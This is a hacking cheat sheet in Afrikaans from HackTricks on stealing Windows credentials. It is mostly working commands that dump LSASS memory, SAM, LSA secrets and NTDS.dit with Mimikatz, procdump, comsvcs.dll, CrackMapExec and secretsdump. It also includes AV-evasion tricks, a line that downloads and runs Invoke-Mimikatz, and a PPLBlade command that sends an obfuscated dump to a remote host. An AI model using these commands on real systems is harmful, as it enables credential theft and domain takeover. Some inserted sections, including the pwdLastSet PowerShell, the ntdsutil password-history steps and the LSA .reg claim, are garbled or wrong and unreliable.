# Steel Windows Gelde

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Gelde Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen in** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Leer hier oor moontlike beskermingsmaatreëls vir geloofsbriewe.**](credentials-protections.md) **Hierdie beskermingsmaatreëls kan voorkom dat Mimikatz sekere geloofsbriewe onttrek.**

## Geloofsbriewe met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat ek geskep het om na wagwoorde en hashs te soek** binne die slagoffer.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Om AV te omseil

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-hulpmiddel** is, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie hulpmiddel gebruik om die lsass-proses te **dump**, die **dump aflaai** en die **geloofsbriewe plaaslik** uit die dump te **onttrek**.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Onttrek geloofsbriewe uit die storting" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Sommige **AV** kan die gebruik van **procdump.exe om lsass.exe te dump** as **skadelik** beskou, dit is omdat hulle die string **"procdump.exe" en "lsass.exe"** opspoor. Dit is dus beter om die **PID** van lsass.exe as 'n **argument** aan procdump **oor te dra in plaas van** die naam lsass.exe.

### Dumping lsass met **comsvcs.dll**

'n DLL genaamd **comsvcs.dll** wat in `C:\Windows\System32` gevind word, is verantwoordelik vir die **dumping van prosesgeheue** in die geval van 'n ongeluk. Hierdie DLL bevat 'n **funksie** genaamd **`MiniDumpW`**, wat ontwerp is om aangeroep te word met behulp van `rundll32.exe`.\
Die eerste twee argumente is irrelevant, maar die derde argument word verdeel in drie komponente. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêerlokasie verteenwoordig die tweede, en die derde komponent is strengweg die woord **full**. Geen alternatiewe opsies bestaan nie.\
Na die ontleding van hierdie drie komponente, skep die DLL die dump-lêer en oordra die geheue van die gespesifiseerde proses na hierdie lêer.\
Die gebruik van die **comsvcs.dll** is moontlik vir die dump van die lsass-proses, wat die behoefte om procdump op te laai en uit te voer, elimineer. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Die volgende opdrag word gebruik vir uitvoering:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass met Task Manager**

1. Regskliek op die Taakbalk en kliek op Taakbestuurder
2. Kliek op Meer besonderhede
3. Soek na die "Local Security Authority Process" proses in die Prosesse-tabblad
4. Regskliek op die "Local Security Authority Process" proses en kliek op "Skep dump-lêer".

### Dumping lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binêre lêer wat deel vorm van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) pakket.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Gereedskap vir die Dumping van Beskermde Prosesse wat geheue-dump obfuskasie ondersteun en dit op afgeleë werkstasies oordra sonder om dit op die skyf te laat val.

**Kernfunksies**:

1. Om PPL-beskerming te omseil
2. Om geheue-dump lêers te obfuskasie om Defender se handtekening-gebaseerde opsporingsmeganismes te ontduik
3. Om geheue-dump op te laai met RAW- en SMB-oplaaimetodes sonder om dit op die skyf te laat val (lêerlose dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM-hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Stort LSA-geheime

#### Beschrywing
Die LSA-geheime is 'n stel kredensiale wat deur die Local Security Authority (LSA) in Windows gestoor word. Hierdie kredensiale kan waardevolle inligting bevat, soos gebruikersname en wagwoorde, wat deur aanvallers gebruik kan word om toegang tot 'n stelsel te verkry.

#### Tegniek
Om die LSA-geheime te stoor, kan jy die volgende stappe volg:

1. Kry toegang tot die stelsel as 'n bevoorregte gebruiker.
2. Voer die volgende opdrag uit om die LSA-geheime te stoor:
   ```
   reg save hklm\security\policy C:\path\to\output\file
   ```
   Hierdie opdrag stoor die LSA-geheime in 'n REG-formaat lêer.
3. Kopieer die uitsetlêer na 'n veilige plek vir verdere analise.

#### Voorbeelde
- Stoor die LSA-geheime in 'n REG-formaat lêer:
  ```
  reg save hklm\security\policy C:\temp\lsa_secrets.reg
  ```

#### Voorkomingsmaatreëls
Om te voorkom dat LSA-geheime gesteel word, kan die volgende maatreëls geneem word:

- Beperk die toegang tot bevoorregte gebruikers.
- Monitor die stelsel vir enige verdagte aktiwiteit.
- Verseker dat die stelsel opgedateer en gepatch is om bekende kwesbaarhede te vermy.
- Implementeer sterk wagwoordbeleide en tweefaktor-verifikasie.
- Gebruik 'n betroubare sekuriteitsoplossing om die stelsel teen aanvalle te beskerm.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Stort die NTDS.dit van die teiken DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Stort die NTDS.dit wagwoordgeskiedenis van teiken DC

```plaintext
This technique allows you to dump the password history stored in the NTDS.dit file on a target Domain Controller (DC). The NTDS.dit file is a database file that contains Active Directory data, including user account information and password hashes.

To perform this technique, you will need administrative access to the target DC. Here are the steps to follow:

1. Obtain administrative access to the target DC.
2. Open a command prompt with administrative privileges.
3. Navigate to the directory where the NTDS.dit file is located. The default location is `C:\Windows\NTDS`.
4. Use the `ntdsutil` command to activate the NTDS.dit file management utility.
5. Once in the NTDS.dit management utility, use the `activate instance ntds` command to activate the NTDS instance.
6. Use the `ifm` command to create an Install From Media (IFM) folder. This folder will contain a copy of the NTDS.dit file.
7. Exit the NTDS.dit management utility.
8. Navigate to the IFM folder that was created in the previous step.
9. Locate the `ntds.dit` file within the IFM folder.
10. Use a tool like `esedbexport` or `dsusers.py` to extract the password history from the `ntds.dit` file.

By following these steps, you will be able to dump the password history from the NTDS.dit file on the target DC. This can be useful for auditing purposes or for recovering passwords in certain scenarios.
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet eienskap vir elke NTDS.dit rekening

Om die pwdLastSet eienskap vir elke NTDS.dit rekening te wys, kan jy die volgende stappe volg:

1. Maak 'n verbind met die NTDS.dit databasis.
2. Kry 'n lys van alle rekeninge in die databasis.
3. Vir elke rekening, haal die pwdLastSet eienskap op.
4. Wys die pwdLastSet eienskap vir elke rekening.

Hier is 'n voorbeeld van hoe jy dit kan doen met PowerShell:

```powershell
$ntdsPath = "C:\Windows\NTDS\NTDS.dit"
$database = New-Object System.DirectoryServices.ActiveDirectory.DomainController
$directory = [System.DirectoryServices.ActiveDirectory.DomainController]::GetDirectoryEntry()
$searcher = New-Object System.DirectoryServices.DirectorySearcher($directory)
$searcher.Filter = "(objectClass=user)"
$searcher.PropertiesToLoad.Add("pwdLastSet")

$results = $searcher.FindAll()

foreach ($result in $results) {
    $account = $result.GetDirectoryEntry()
    $pwdLastSet = $account.pwdLastSet.Value
    Write-Host "pwdLastSet for account $($account.Name): $pwdLastSet"
}
```

Hierdie skripsie sal die pwdLastSet eienskap vir elke NTDS.dit rekening wys.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Steel SAM & SYSTEM

Hierdie lêers moet **gevind word** in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie net op 'n gewone manier kopieer nie** omdat hulle beskerm word.

### Uit die Register

Die maklikste manier om hierdie lêers te steel, is om 'n kopie uit die register te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai** daardie lêers af na jou Kali-masjien en **onttrek die hase** met behulp van:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan 'n kopie van beskermde lêers maak deur hierdie diens te gebruik. Jy moet 'n Administrateur wees.

#### Gebruik van vssadmin

vssadmin binêre lêer is slegs beskikbaar in Windows Server-weergawes.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde doen vanuit **Powershell**. Hier is 'n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word, is "C:" en dit word gestoor in C:\gebruikers\Openbaar), maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Uiteindelik kan jy ook die [**PS-skrip Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Aktiewe Direktori-gedragsbepalings - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Aktiewe Direktori**, wat kritieke data oor gebruikersobjekte, groepe en hul lidmaatskappe bevat. Dit is waar die **wagwoordhasings** vir domeingebruikers gestoor word. Hierdie lêer is 'n **Uitbreibare Berging Enjin (ESE)** databasis en bly in **_%SystemRoom%/NTDS/ntds.dit_**.

Binne hierdie databasis word drie primêre tabelle onderhou:

- **Data Tabel**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objekte soos gebruikers en groepe.
- **Skakel Tabel**: Dit hou rekord van verhoudings, soos groepslidmaatskappe.
- **SD Tabel**: **Sekuriteitsbeskrywers** vir elke objek word hier gehou, wat die sekuriteit en toegangsbeheer vir die gestoorde objekte verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur _lsass.exe_ gebruik. Dan kan **deel** van die **NTDS.dit**-lêer **binne die `lsass`-geheue** geleë word (jy kan waarskynlik die onlangse toegang tot data vind as gevolg van die prestasieverbetering deur 'n **kas** te gebruik).

#### Ontsleuteling van die hasings binne NTDS.dit

Die hasing word 3 keer versleutel:

1. Ontsleutel Wagwoordversleuteling Sleutel (**PEK**) met behulp van die **BOOTKEY** en **RC4**.
2. Ontsleutel die **has** met behulp van **PEK** en **RC4**.
3. Ontsleutel die **has** met behulp van **DES**.

**PEK** het dieselfde waarde in **elke domeinbeheerder**, maar dit is **versleutel** binne die **NTDS.dit**-lêer met behulp van die **BOOTKEY** van die **SYSTEM-lêer van die domeinbeheerder (verskil tussen domeinbeheerders)**. Dit is waarom jy die geloofsbriewe uit die NTDS.dit-lêer moet kry **jy benodig die lêers NTDS.dit en SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiëring van NTDS.dit met behulp van Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die **volume skyf kopie** truuk gebruik om die **ntds.dit** lêer te kopieer. Onthou dat jy ook 'n kopie van die **SYSTEM lêer** sal benodig (weer, [**dump dit van die register of gebruik die volume skyf kopie**](./#stealing-sam-and-system) truuk).

### **Uittreksel van hasings uit NTDS.dit**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** verkry het, kan jy gereedskap soos _secretsdump.py_ gebruik om die hasings uit te trek:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan hulle ook **outomaties onttrek** deur 'n geldige domein-admin-gebruiker te gebruik:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit-lêers** word aanbeveel om dit te onttrek met behulp van [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Uiteindelik kan jy ook die **metasploit-module** gebruik: _post/windows/gather/credentials/domain\_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Onttrekking van domeinvoorwerpe uit NTDS.dit na 'n SQLite-databasis**

NTDS-voorwerpe kan onttrek word na 'n SQLite-databasis met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie net geheime word onttrek nie, maar ook die hele voorwerpe en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit-lêer reeds herwin is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM`-by is opsioneel, maar maak dit moontlik om geheime te ontsluit (NT- en LM-hashes, aanvullende geloofsbriewe soos teks wagwoorde, kerberos- of vertrouensleutels, NT- en LM-wagwoordgeskiedenis). Saam met ander inligting word die volgende data onttrek: gebruikers- en masjienrekeninge met hul hasings, UAC-vlae, tydstempel vir laaste aanmelding en wagwoordverandering, rekeningbeskrywing, name, UPN, SPN, groepe en herhalende lidmaatskappe, organisatoriese eenhedeboom en lidmaatskap, vertroue domeine met vertrouens tipe, rigting en eienskappe...

## Lazagne

Laai die binêre lêer van [hier](https://github.com/AlessandroZ/LaZagne/releases) af. Jy kan hierdie binêre lêer gebruik om geloofsbriewe uit verskeie sagteware te onttrek.
```
lazagne.exe all
```
## Ander gereedskap vir die onttrekking van geloofsbriewe uit SAM en LSASS

### Windows-geloofsbriewe-redakteur (WCE)

Hierdie gereedskap kan gebruik word om geloofsbriewe uit die geheue te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek geloofsbriewe uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Onttrek geloofsbriewe uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laai dit af vanaf: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) en voer dit net **uit** en die wagwoorde sal onttrek word.

## Verdedigings

[**Leer hier oor sommige wagwoordbeskermingsmaatreëls.**](credentials-protections.md)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
